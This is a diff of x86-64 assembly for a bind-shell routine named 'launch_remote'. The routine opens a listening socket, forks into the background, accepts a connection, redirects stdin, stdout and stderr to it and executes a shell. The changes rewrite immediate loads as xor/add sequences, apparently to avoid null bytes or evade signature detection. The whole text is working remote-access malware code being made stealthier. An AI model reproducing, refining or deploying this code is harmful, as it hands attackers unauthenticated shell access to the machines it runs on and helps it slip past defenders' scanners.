@@ -26,19 +26,26 @@ section .text
 launch_remote:
     push    rbp
     mov     rbp, rsp
-    mov     rdi, 2 ; AF_INET
-    mov     rsi, 1 ; SOCK_STREAM
-    mov     rdx, 0 ; IP
-    mov     rax, 0x29 ; socket
+    xor     edi, edi
+    xor     esi, esi
+    xor     rdx, rdx ; IP
+    xor     eax, eax
+    add     edi, 2 ; AF_INET
+    add     esi, 1 ; SOCK_STREAM
+    add     eax, 0x29 ; socket
     syscall
     mov     [sock_fd], eax
-    mov     edi, [sock_fd]
-    mov     rsi, 1
-    mov     rdx, 2 ; SO_REUSEADDRESS
+    mov     edi, eax
+    xor     esi, esi
+    mov     edi, edi
+    add     esi, 1
+    add     edx, 2 ; SO_REUSEADDRESS
     push    1
     lea     r10, [rsp]
-    mov     r8, 4
-    mov     rax, 0x36 ; setsockopt
+    xor     r8, r8
+    xor     eax, eax
+    add     r8, 4
+    add     eax, 0x36 ; setsockopt
     syscall
     mov     [family], WORD 2 ; AF_INET
     mov     [port], DWORD 0 ; htons(4343)
@@ -46,53 +53,68 @@ launch_remote:
     mov     edi, [sock_fd]
     lea     rsi, [rel serv]
     mov     rdx, servlen
-    mov     rax, 0x31 ; bind
+    xor     eax, eax
+    add     eax, 0x31 ; bind
     syscall
     mov     edi, DWORD [sock_fd]
-    mov     rsi, 1
-    mov     rax, 0x32 ; listen
+    xor     esi, esi
+    xor     eax, eax
+    add     esi, 1
+    add     eax, 0x32 ; listen
     syscall
     mov     edi, DWORD [sock_fd]
     mov     rsi, [shell_port]
     mov     DWORD [rsp], 0x10 ; sizeof(sockaddr_in)
     lea     rdx, [rsp]
-    mov     rax, 0x33 ; getsockname
+    xor     eax, eax
+    add     eax, 0x33 ; getsockname
     syscall
     ; ecrire le port dans la globale
-    mov     rax, 0x39 ; fork
+    xor     eax, eax
+    add     eax, 0x39 ; fork
     syscall
-    cmp     rax, 0
+    cmp     eax, 0
     je      child
-    mov     rdi, 0
-    mov     rax, 0x3c
+    xor     edi, edi
+    xor     eax, eax
+    add     edi, 0
+    add     eax, 0x3c ; exit
     syscall
 child:
     mov     edi, DWORD [sock_fd]
     lea     rsi, [rel client]
     lea     rdx, [rel clen]
-    mov     rax, 0x2b ; accept
+    xor     eax, eax
+    add     eax, 0x2b ; accept
     syscall
     mov     [client_fd], DWORD eax
     mov     edi, DWORD [client_fd]
-    mov     rsi, 0
-    mov     rax, 0x21 ; dup2
+    xor     esi, esi
+    xor     eax, eax
+    add     eax, 0x21 ; dup2
     syscall
     mov     edi, DWORD [client_fd]
-    mov     rsi, 1
-    mov     rax, 0x21 ; dup2
+    xor     esi, esi
+    xor     eax, eax
+    add     esi, 1
+    add     eax, 0x21 ; dup2
     syscall
     mov     edi, DWORD [client_fd]
-    mov     rsi, 2
-    mov     rax, 0x21 ; dup2
+    xor     esi, esi
+    xor     eax, eax
+    add     esi, 2
+    add     eax, 0x21 ; dup2
     syscall
     lea     rdi, [rel sh]
     lea     rsi, [rel args]
-    mov     rdx, 0
-    mov     rax, 0x3b ; execve
+    xor     edx, edx
+    xor     eax, eax
+    add     rax, 0x3b ; execve
     syscall
 exit:
-    mov     rdi, 0
-    mov     rax, 0x3c ; exit
+    xor     edi, edi
+    xor     eax, eax
+    add     eax, 0x3c ; exit
     syscall
     leave
     ret
